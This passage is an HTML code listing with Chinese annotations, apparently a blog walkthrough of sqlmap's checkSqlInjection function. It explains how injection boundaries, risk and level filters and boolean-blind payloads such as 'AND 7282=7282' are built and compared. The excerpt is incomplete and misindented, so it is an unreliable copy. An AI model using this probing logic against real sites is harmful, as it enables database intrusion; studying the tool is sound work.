class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSqlInjection</span><span class="params">(place, parameter, value)</span>:</span></span><br><span class="line">    <span class="comment">#在这里存储有关边界和有效载荷的详细信息</span></span><br><span class="line">    <span class="comment"># 这里继承了 AttribDict 就封装的字典用于存储一些注入成功的数据</span></span><br><span class="line">    injection = InjectionDict()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加载当前线程数据</span></span><br><span class="line">    threadData = getCurrentThreadData()</span><br><span class="line">    <span class="comment"># 调整边界顺序</span></span><br><span class="line">    <span class="comment"># 如果参数的value只是数字类型的 调整下排序顺序 数字的在前面如果是数字</span></span><br><span class="line">    <span class="keyword">if</span> value.isdigit():</span><br><span class="line">        kb.cache.intBoundaries = kb.cache.intBoundaries <span class="keyword">or</span> sorted(copy.deepcopy(conf.boundaries), key=<span class="keyword">lambda</span> boundary: any(_ <span class="keyword">in</span> (boundary.prefix <span class="keyword">or</span> <span class="string">""</span>) <span class="keyword">or</span> _ <span class="keyword">in</span> (boundary.suffix <span class="keyword">or</span> <span class="string">""</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> (<span class="string">'"'</span>, <span class="string">'\''</span>)))</span><br><span class="line">        boundaries = kb.cache.intBoundaries</span><br><span class="line">    <span class="keyword">elif</span> value.isalpha():</span><br><span class="line">        kb.cache.alphaBoundaries = kb.cache.alphaBoundaries <span class="keyword">or</span> sorted(copy.deepcopy(conf.boundaries), key=<span class="keyword">lambda</span> boundary: <span class="keyword">not</span> any(_ <span class="keyword">in</span> (boundary.prefix <span class="keyword">or</span> <span class="string">""</span>) <span class="keyword">or</span> _ <span class="keyword">in</span> (boundary.suffix <span class="keyword">or</span> <span class="string">""</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> (<span class="string">'"'</span>, <span class="string">'\''</span>)))</span><br><span class="line">        boundaries = kb.cache.alphaBoundaries</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        boundaries = conf.boundaries</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置测试True</span></span><br><span class="line">    kb.testMode = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    paramType = conf.method <span class="keyword">if</span> conf.method <span class="keyword">not</span> <span class="keyword">in</span> (<span class="literal">None</span>, HTTPMETHOD.GET, HTTPMETHOD.POST) <span class="keyword">else</span> place</span><br><span class="line">    tests = getSortedInjectionTests()</span><br><span class="line">    <span class="comment"># 这里根据上面数据库报错的类型确实的数据库的优先级返测试列表 调整的是顺序</span></span><br><span class="line">    <span class="comment"># 每一条如下</span></span><br><span class="line">    <span class="comment"># &#123;'risk': 1, 危险程度 比如数据库删除就比较高 参数的时候也可以配置</span></span><br><span class="line">    <span class="comment"># 'title': 'AND boolean-based blind - WHERE or HAVING clause', 测试输出的标题</span></span><br><span class="line">    <span class="comment"># 'clause': [1, 8, 9],</span></span><br><span class="line">    <span class="comment"># 'level': 1, 级别</span></span><br><span class="line">    <span class="comment"># 'request': &#123;'payload': 'AND [RANDNUM]=[RANDNUM]'&#125;, 请求的payload</span></span><br><span class="line">    <span class="comment"># 'vector': 'AND [INFERENCE]',</span></span><br><span class="line">    <span class="comment"># 'where': [1],</span></span><br><span class="line">    <span class="comment"># 'response': &#123;</span></span><br><span class="line">    <span class="comment">#     'comparison': 'AND [RANDNUM]=[RANDNUM1]'</span></span><br><span class="line">    <span class="comment">#     &#125;,</span></span><br><span class="line">    <span class="comment"># 'stype': 1&#125;</span></span><br><span class="line">    seenPayload = set()</span><br><span class="line">    <span class="comment"># 设置默认随机数字和随机字符串10位长度</span></span><br><span class="line">    kb.data.setdefault(<span class="string">"randomInt"</span>, str(randomInt(<span class="number">10</span>)))</span><br><span class="line">    kb.data.setdefault(<span class="string">"randomStr"</span>, str(randomStr(<span class="number">10</span>)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> tests:</span><br><span class="line">        test = tests.pop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> kb.endDetection:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            title = test.title <span class="comment"># 'AND boolean-based blind - WHERE or HAVING clause'</span></span><br><span class="line">            kb.testType = stype = test.stype <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 1: Boolean-based blind SQL injection</span></span><br><span class="line">            <span class="comment"># 2: Error-based queries SQL injection</span></span><br><span class="line">            <span class="comment"># 3: Inline queries SQL injection</span></span><br><span class="line">            <span class="comment"># 4: Stacked queries SQL injection</span></span><br><span class="line">            <span class="comment"># 5: Time-based blind SQL injection</span></span><br><span class="line">            <span class="comment"># 6: UNION query SQL injection</span></span><br><span class="line"></span><br><span class="line">            clause = test.clause <span class="comment"># [1, 8, 9]</span></span><br><span class="line">            <span class="comment">#payload在哪个位置生效  </span></span><br><span class="line">            <span class="comment"># 0: Always</span></span><br><span class="line">            <span class="comment"># 1: WHERE / HAVING</span></span><br><span class="line">            <span class="comment"># 2: GROUP BY</span></span><br><span class="line">            <span class="comment"># 3: ORDER BY</span></span><br><span class="line">            <span class="comment"># 4: LIMIT</span></span><br><span class="line">            <span class="comment"># 5: OFFSET</span></span><br><span class="line">            <span class="comment"># 6: TOP</span></span><br><span class="line">            <span class="comment"># 7: Table name</span></span><br><span class="line">            <span class="comment"># 8: Column name</span></span><br><span class="line">            <span class="comment"># 9: Pre-WHERE (non-query)</span></span><br><span class="line"></span><br><span class="line">            unionExtended = <span class="literal">False</span></span><br><span class="line">            trueCode, falseCode = <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 联合查询</span></span><br><span class="line">            <span class="keyword">if</span> stype == PAYLOAD.TECHNIQUE.UNION: <span class="comment"># 6 union联合查询 我们这条测试语句是1</span></span><br><span class="line">                configUnion(test.request.char)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="string">"[CHAR]"</span> <span class="keyword">in</span> title:</span><br><span class="line">                    <span class="keyword">if</span> conf.uChar <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        title = title.replace(<span class="string">"[CHAR]"</span>, conf.uChar)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">elif</span> <span class="string">"[RANDNUM]"</span> <span class="keyword">in</span> title <span class="keyword">or</span> <span class="string">"(NULL)"</span> <span class="keyword">in</span> title:</span><br><span class="line">                    title = title.replace(<span class="string">"[RANDNUM]"</span>, <span class="string">"random number"</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> test.request.columns == <span class="string">"[COLSTART]-[COLSTOP]"</span>:</span><br><span class="line">                    <span class="keyword">if</span> conf.uCols <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        title = title.replace(<span class="string">"[COLSTART]"</span>, str(conf.uColsStart))</span><br><span class="line">                        title = title.replace(<span class="string">"[COLSTOP]"</span>, str(conf.uColsStop))</span><br><span class="line"></span><br><span class="line">                <span class="keyword">elif</span> conf.uCols <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    debugMsg = <span class="string">"skipping test '%s' because the user "</span> % title</span><br><span class="line">                    debugMsg += <span class="string">"provided custom column range %s"</span> % conf.uCols</span><br><span class="line">                    logger.debug(debugMsg)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                match = re.search(<span class="string">r"(\d+)-(\d+)"</span>, test.request.columns)</span><br><span class="line">                <span class="keyword">if</span> match <span class="keyword">and</span> injection.data:</span><br><span class="line">                    lower, upper = int(match.group(<span class="number">1</span>)), int(match.group(<span class="number">2</span>))</span><br><span class="line">                    <span class="keyword">for</span> _ <span class="keyword">in</span> (lower, upper):</span><br><span class="line">                        <span class="keyword">if</span> _ &gt; <span class="number">1</span>:</span><br><span class="line">                            __ = <span class="number">2</span> * (_ - <span class="number">1</span>) + <span class="number">1</span> <span class="keyword">if</span> _ == lower <span class="keyword">else</span> <span class="number">2</span> * _</span><br><span class="line">                            unionExtended = <span class="literal">True</span></span><br><span class="line">                            test.request.columns = re.sub(<span class="string">r"\b%d\b"</span> % _, str(__), test.request.columns)</span><br><span class="line">                            title = re.sub(<span class="string">r"\b%d\b"</span> % _, str(__), title)</span><br><span class="line">                            test.title = re.sub(<span class="string">r"\b%d\b"</span> % _, str(__), test.title)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#如果用户只想测试特定的类型</span></span><br><span class="line">            <span class="keyword">if</span> conf.tech <span class="keyword">and</span> isinstance(conf.tech, list) <span class="keyword">and</span> stype <span class="keyword">not</span> <span class="keyword">in</span> conf.tech:</span><br><span class="line">                debugMsg = <span class="string">"skipping test '%s' because the user "</span> % title</span><br><span class="line">                debugMsg += <span class="string">"specified to test only for "</span></span><br><span class="line">                debugMsg += <span class="string">"%s techniques"</span> % <span class="string">" &amp; "</span>.join(PAYLOAD.SQLINJECTION[_] <span class="keyword">for</span> _ <span class="keyword">in</span> conf.tech)</span><br><span class="line">                logger.debug(debugMsg)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">#如果已经是相同的sql注入类型，则跳过测试</span></span><br><span class="line">            <span class="comment">#由另一个测试确定</span></span><br><span class="line">            <span class="keyword">if</span> injection.data <span class="keyword">and</span> stype <span class="keyword">in</span> injection.data:</span><br><span class="line">                debugMsg = <span class="string">"skipping test '%s' because "</span> % title</span><br><span class="line">                debugMsg += <span class="string">"the payload for %s has "</span> % PAYLOAD.SQLINJECTION[stype]</span><br><span class="line">                debugMsg += <span class="string">"already been identified"</span></span><br><span class="line">                logger.debug(debugMsg)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">#分析DBMS特定有效负载的详细信息</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"details"</span> <span class="keyword">in</span> test <span class="keyword">and</span> <span class="string">"dbms"</span> <span class="keyword">in</span> test.details:</span><br><span class="line">                payloadDbms = test.details.dbms</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payloadDbms = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 这里省略了各种跳过一些测试的判断</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> conf.testFilter <span class="keyword">and</span> <span class="keyword">not</span> (kb.extendTests <span class="keyword">and</span> intersect(payloadDbms, kb.extendTests, <span class="literal">True</span>)):</span><br><span class="line">                <span class="comment"># 高过配置的危险级别不执行</span></span><br><span class="line">                <span class="keyword">if</span> test.risk &gt; conf.risk:</span><br><span class="line">                    debugMsg = <span class="string">"skipping test '%s' because the risk (%d) "</span> % (title, test.risk)</span><br><span class="line">                    debugMsg += <span class="string">"is higher than the provided (%d)"</span> % conf.risk</span><br><span class="line">                    logger.debug(debugMsg)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment"># 还要对于 level 等级进行限制</span></span><br><span class="line">                <span class="keyword">if</span> test.level &gt; conf.level:</span><br><span class="line">                    debugMsg = <span class="string">"skipping test '%s' because the level (%d) "</span> % (title, test.level)</span><br><span class="line">                    debugMsg += <span class="string">"is higher than the provided (%d)"</span> % conf.level</span><br><span class="line">                    logger.debug(debugMsg)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 输出测试标题</span></span><br><span class="line">            infoMsg = <span class="string">"testing '%s'"</span> % title</span><br><span class="line">            logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#根据当前测试dbms值强制后端dbms</span></span><br><span class="line">            <span class="comment">#正确的有效载荷</span></span><br><span class="line">            <span class="comment"># 根据启发式获取的数据库类型来配置到 Backend</span></span><br><span class="line">            Backend.forceDbms(payloadDbms[<span class="number">0</span>] <span class="keyword">if</span> isinstance(payloadDbms, list) <span class="keyword">else</span> payloadDbms)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#  comment 是空  因为 test.request 是 &#123;'payload': 'AND [RANDNUM]=[RANDNUM]'&#125;</span></span><br><span class="line">            comment = agent.getComment(test.request) <span class="keyword">if</span> len(conf.boundaries) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">            fstPayload = agent.cleanupPayload(test.request.payload, origValue=value <span class="keyword">if</span> place <span class="keyword">not</span> <span class="keyword">in</span> (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER) <span class="keyword">and</span> BOUNDED_INJECTION_MARKER <span class="keyword">not</span> <span class="keyword">in</span> (value <span class="keyword">or</span> <span class="string">""</span>) <span class="keyword">else</span> <span class="literal">None</span>)</span><br><span class="line">            <span class="comment"># 这里面对标识符进行替换 这里是 RANDNUM 换为随机数字</span></span><br><span class="line">            <span class="comment"># 最后获取 fstPayload 'AND 7282=7282'</span></span><br><span class="line">            <span class="comment"># 这个边界 就是各种闭合的  ' and '1'='1  闭合单引号</span></span><br><span class="line">            <span class="keyword">for</span> boundary <span class="keyword">in</span> boundaries:</span><br><span class="line">                injectable = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> boundary.level &gt; conf.level <span class="keyword">and</span> <span class="keyword">not</span> (kb.extendTests <span class="keyword">and</span> intersect(payloadDbms, kb.extendTests, <span class="literal">True</span>)):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment"># 字段 要匹配上才可以 test的生效字段和 边界的</span></span><br><span class="line">                clauseMatch = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> clauseTest <span class="keyword">in</span> test.clause:</span><br><span class="line">                    <span class="keyword">if</span> clauseTest <span class="keyword">in</span> boundary.clause:</span><br><span class="line">                        clauseMatch = <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> test.clause != [<span class="number">0</span>] <span class="keyword">and</span> boundary.clause != [<span class="number">0</span>] <span class="keyword">and</span> <span class="keyword">not</span> clauseMatch:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                whereMatch = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> where <span class="keyword">in</span> test.where:</span><br><span class="line">                    <span class="keyword">if</span> where <span class="keyword">in</span> boundary.where:</span><br><span class="line">                        whereMatch = <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> whereMatch:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment"># 对 payload进行去重 正则去掉 数字等变量</span></span><br><span class="line">                    <span class="keyword">if</span> fstPayload:</span><br><span class="line">                        boundPayload = agent.prefixQuery(fstPayload, prefix, where, clause)</span><br><span class="line">                        boundPayload = agent.suffixQuery(boundPayload, comment, suffix, where)</span><br><span class="line">                        reqPayload = agent.payload(place, parameter, newValue=boundPayload, where=where)</span><br><span class="line">                        <span class="comment"># reqPayload= u'id=__PAYLOAD_DELIMITER__1) AND 7282=7282 AND (5049=5049__PAYLOAD_DELIMITER__'</span></span><br><span class="line">                        <span class="comment"># 这里对测试语句进行payload标识位置</span></span><br><span class="line">                        <span class="keyword">if</span> reqPayload:</span><br><span class="line">                            stripPayload = re.sub(<span class="string">r"(\A|\b|_)([A-Za-z]&#123;4&#125;((?&lt;!LIKE))|\d+)(_|\b|\Z)"</span>, <span class="string">r"\g&lt;1&gt;.\g&lt;4&gt;"</span>, reqPayload)</span><br><span class="line">                            <span class="keyword">if</span> stripPayload <span class="keyword">in</span> seenPayload:</span><br><span class="line">                                <span class="comment"># stripPayload = u'id=__PAYLOAD_DELIMITER__.) AND .=. AND (.=.__PAYLOAD_DELIMITER__'</span></span><br><span class="line">                                <span class="keyword">continue</span></span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                seenPayload.add(stripPayload)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        reqPayload = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment"># 执行测试请求并检查</span></span><br><span class="line">                    <span class="comment">#分析测试的&lt;response&gt;</span></span><br><span class="line">                    <span class="keyword">for</span> method, check <span class="keyword">in</span> test.response.items():</span><br><span class="line">                        check = agent.cleanupPayload(check, origValue=value <span class="keyword">if</span> place <span class="keyword">not</span> <span class="keyword">in</span> (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER) <span class="keyword">and</span> BOUNDED_INJECTION_MARKER <span class="keyword">not</span> <span class="keyword">in</span> (value <span class="keyword">or</span> <span class="string">""</span>) <span class="keyword">else</span> <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">                        <span class="comment"># 布尔盲注</span></span><br><span class="line">                        <span class="keyword">if</span> method == PAYLOAD.METHOD.COMPARISON:</span><br><span class="line">                            <span class="comment"># Generate payload used for comparison</span></span><br><span class="line">                            <span class="function"><span class="keyword">def</span> <span class="title">genCmpPayload</span><span class="params">()</span>:</span></span><br><span class="line">                                sndPayload = agent.cleanupPayload(test.response.comparison, origValue=value <span class="keyword">if</span> place <span class="keyword">not</span> <span class="keyword">in</span> (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER) <span class="keyword">and</span> BOUNDED_INJECTION_MARKER <span class="keyword">not</span> <span class="keyword">in</span> (value <span class="keyword">or</span> <span class="string">""</span>) <span class="keyword">else</span> <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">                                <span class="comment"># Forge response payload by prepending with</span></span><br><span class="line">                                <span class="comment"># boundary's prefix and appending the boundary's</span></span><br><span class="line">                                <span class="comment"># suffix to the test's ' &lt;payload&gt;&lt;comment&gt; '</span></span><br><span class="line">                                <span class="comment"># string</span></span><br><span class="line">                                boundPayload = agent.prefixQuery(sndPayload, prefix, where, clause)</span><br><span class="line">                                boundPayload = agent.suffixQuery(boundPayload, comment, suffix, where)</span><br><span class="line">                                cmpPayload = agent.payload(place, parameter, newValue=boundPayload, where=where)</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">return</span> cmpPayload</span><br><span class="line"></span><br><span class="line">                            <span class="comment"># Useful to set kb.matchRatio at first based on</span></span><br><span class="line">                            <span class="comment"># the False response content</span></span><br><span class="line">                            kb.matchRatio = <span class="literal">None</span></span><br><span class="line">                            kb.negativeLogic = (where == PAYLOAD.WHERE.NEGATIVE)</span><br><span class="line">                            <span class="comment"># 传入的 u'id=__PAYLOAD_DELIMITER__1) AND 9287=9488 AND (8325=8325__PAYLOAD_DELIMITER__'</span></span><br><span class="line">                            Request.queryPage(genCmpPayload(), place, raise404=<span class="literal">False</span>)</span><br><span class="line">                            falsePage, falseHeaders, falseCode = threadData.lastComparisonPage <span class="keyword">or</span> <span class="string">""</span>, threadData.lastComparisonHeaders, threadData.lastComparisonCode</span><br><span class="line">                            falseRawResponse = <span class="string">"%s%s"</span> % (falseHeaders, falsePage)</span><br><span class="line"></span><br><span class="line">                            <span class="comment"># Perform the test's True request</span></span><br><span class="line">                            <span class="comment"># true</span></span><br><span class="line">                            trueResult = Request.queryPage(reqPayload, place, raise404=<span class="literal">False</span>)</span><br><span class="line">                            truePage, trueHeaders, trueCode = threadData.lastComparisonPage <span class="keyword">or</span> <span class="string">""</span>, threadData.lastComparisonHeaders, threadData.lastComparisonCode</span><br><span class="line">                            trueRawResponse = <span class="string">"%s%s"</span> % (trueHeaders, truePage)</span><br><span class="line">                            <span class="comment"># 两次页面不一样的话继续走</span></span><br><span class="line">                            <span class="keyword">if</span> trueResult <span class="keyword">and</span> <span class="keyword">not</span>(truePage == falsePage <span class="keyword">and</span> <span class="keyword">not</span> kb.nullConnection):</span><br><span class="line">                                <span class="comment"># Perform the test's False request</span></span><br><span class="line">                                falseResult = Request.queryPage(genCmpPayload(), place, raise404=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> <span class="keyword">not</span> falseResult:</span><br><span class="line">                                    <span class="keyword">if</span> kb.negativeLogic:</span><br><span class="line">                                        boundPayload = agent.prefixQuery(kb.data.randomStr, prefix, where, clause)</span><br><span class="line">                                        boundPayload = agent.suffixQuery(boundPayload, comment, suffix, where)</span><br><span class="line">                                        errorPayload = agent.payload(place, parameter, newValue=boundPayload, where=where)</span><br><span class="line"></span><br><span class="line">                                        errorResult = Request.queryPage(errorPayload, place, raise404=<span class="literal">False</span>)</span><br><span class="line">                                        <span class="keyword">if</span> errorResult:</span><br><span class="line">                                            <span class="keyword">continue</span></span><br><span class="line">                                    <span class="keyword">elif</span> kb.heuristicPage <span class="keyword">and</span> <span class="keyword">not</span> any((conf.string, conf.notString, conf.regexp, conf.code, kb.nullConnection)):</span><br><span class="line">                                        _ = comparison(kb.heuristicPage, <span class="literal">None</span>, getRatioValue=<span class="literal">True</span>)</span><br><span class="line">                                        <span class="keyword">if</span> _ &gt; kb.matchRatio:</span><br><span class="line">                                            kb.matchRatio = _</span><br><span class="line">                                            logger.debug(<span class="string">"adjusting match ratio for current parameter to %.3f"</span> % kb.matchRatio)</span><br><span class="line"></span><br><span class="line">                                    <span class="comment"># Reducing false-positive "appears" messages in heavily dynamic environment</span></span><br><span class="line">                                    <span class="keyword">if</span> kb.heavilyDynamic <span class="keyword">and</span> <span class="keyword">not</span> Request.queryPage(reqPayload, place, raise404=<span class="literal">False</span>):</span><br><span class="line">                                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                                    injectable = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                                <span class="keyword">elif</span> threadData.lastComparisonRatio &gt; UPPER_RATIO_BOUND <span class="keyword">and</span> <span class="keyword">not</span> any((conf.string, conf.notString, conf.regexp, conf.code, kb.nullConnection)):</span><br><span class="line">                                    originalSet = set(getFilteredPageContent(kb.pageTemplate, <span class="literal">True</span>, <span class="string">"\n"</span>).split(<span class="string">"\n"</span>))</span><br><span class="line">                                    trueSet = set(getFilteredPageContent(truePage, <span class="literal">True</span>, <span class="string">"\n"</span>).split(<span class="string">"\n"</span>))</span><br><span class="line">                                    falseSet = set(getFilteredPageContent(falsePage, <span class="literal">True</span>, <span class="string">"\n"</span>).split(<span class="string">"\n"</span>))</span><br><span class="line"></span><br><span class="line">                                    <span class="keyword">if</span> threadData.lastErrorPage <span class="keyword">and</span> threadData.lastErrorPage[<span class="number">1</span>]:</span><br><span class="line">                                        errorSet = set(getFilteredPageContent(threadData.lastErrorPage[<span class="number">1</span>], <span class="literal">True</span>, <span class="string">"\n"</span>).split(<span class="string">"\n"</span>))</span><br><span class="line">                                    <span class="keyword">else</span>:</span><br><span class="line">                                        errorSet = set()</span><br><span class="line"></span><br><span class="line">                                    <span class="keyword">if</span> originalSet == trueSet != falseSet:</span><br><span class="line">                                        candidates = trueSet - falseSet - errorSet</span><br><span class="line"></span><br><span class="line">                                        <span class="keyword">if</span> candidates:</span><br><span class="line">                                            candidates = sorted(candidates, key=<span class="keyword">lambda</span> _: len(_))</span><br><span class="line">                                            <span class="keyword">for</span> candidate <span class="keyword">in</span> candidates:</span><br><span class="line">                                                <span class="keyword">if</span> re.match(<span class="string">r"\A[\w.,! ]+\Z"</span>, candidate) <span class="keyword">and</span> <span class="string">' '</span> <span class="keyword">in</span> candidate <span class="keyword">and</span> candidate.strip() <span class="keyword">and</span> len(candidate) &gt; CANDIDATE_SENTENCE_MIN_LENGTH:</span><br><span class="line">                                                    conf.string = candidate</span><br><span class="line">                                                    injectable = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                                                    infoMsg = <span class="string">"%s parameter '%s' appears to be '%s' injectable (with --string=\"%s\")"</span> % (paramType, parameter, title, repr(conf.string).lstrip(<span class="string">'u'</span>).strip(<span class="string">"'"</span>))</span><br><span class="line">                                                    logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line">                                                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> injectable:</span><br><span class="line">                                <span class="keyword">if</span> kb.pageStable <span class="keyword">and</span> <span class="keyword">not</span> any((conf.string, conf.notString, conf.regexp, conf.code, kb.nullConnection)):</span><br><span class="line">                                    <span class="keyword">if</span> all((falseCode, trueCode)) <span class="keyword">and</span> falseCode != trueCode:</span><br><span class="line">                                        conf.code = trueCode</span><br><span class="line"></span><br><span class="line">                                        infoMsg = <span class="string">"%s parameter '%s' appears to be '%s' injectable (with --code=%d)"</span> % (paramType, parameter, title, conf.code)</span><br><span class="line">                                        logger.info(infoMsg)</span><br><span class="line">                                    <span class="keyword">else</span>:</span><br><span class="line">                                        trueSet = set(extractTextTagContent(trueRawResponse))</span><br><span class="line">                                        trueSet |= set(__ <span class="keyword">for</span> _ <span class="keyword">in</span> trueSet <span class="keyword">for</span> __ <span class="keyword">in</span> _.split())</span><br><span class="line"></span><br><span class="line">                                        falseSet = set(extractTextTagContent(falseRawResponse))</span><br><span class="line">                                        falseSet |= set(__ <span class="keyword">for</span> _ <span class="keyword">in</span> falseSet <span class="keyword">for</span> __ <span class="keyword">in</span> _.split())</span><br><span class="line"></span><br><span class="line">                                        <span class="keyword">if</span> threadData.lastErrorPage <span class="keyword">and</span> threadData.lastErrorPage[<span class="number">1</span>]:</span><br><span class="line">                                            errorSet = set(extractTextTagContent(threadData.lastErrorPage[<span class="number">1</span>]))</span><br><span class="line">                                            errorSet |= set(__ <span class="keyword">for</span> _ <span class="keyword">in</span> errorSet <span class="keyword">for</span> __ <span class="keyword">in</span> _.split())</span><br><span class="line">                                        <span class="keyword">else</span>:</span><br><span class="line">                                            errorSet = set()</span><br><span class="line"></span><br><span class="line">                                        candidates = filter(<span class="literal">None</span>, (_.strip() <span class="keyword">if</span> _.strip() <span class="keyword">in</span> trueRawResponse <span class="keyword">and</span> _.strip() <span class="keyword">not</span> <span class="keyword">in</span> falseRawResponse <span class="keyword">else</span> <span class="literal">None</span> <span class="keyword">for</span> _ <span class="keyword">in</span> (trueSet - falseSet - errorSet)))</span><br><span class="line"></span><br><span class="line">                                        <span class="keyword">if</span> candidates:</span><br><span class="line">                                            candidates = sorted(candidates, key=<span class="keyword">lambda</span> _: len(_))</span><br><span class="line">                                            <span class="keyword">for</span> candidate <span class="keyword">in</span> candidates:</span><br><span class="line">                                                <span class="keyword">if</span> re.match(<span class="string">r"\A\w+\Z"</span>, candidate):</span><br><span class="line">                                                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                                            conf.string = candidate</span><br><span class="line"></span><br><span class="line">                                            infoMsg = <span class="string">"%s parameter '%s' appears to be '%s' injectable (with --string=\"%s\")"</span> % (paramType, parameter, title, repr(conf.string).lstrip(<span class="string">'u'</span>).strip(<span class="string">"'"</span>))</span><br><span class="line">                                            logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line">                                        <span class="keyword">if</span> <span 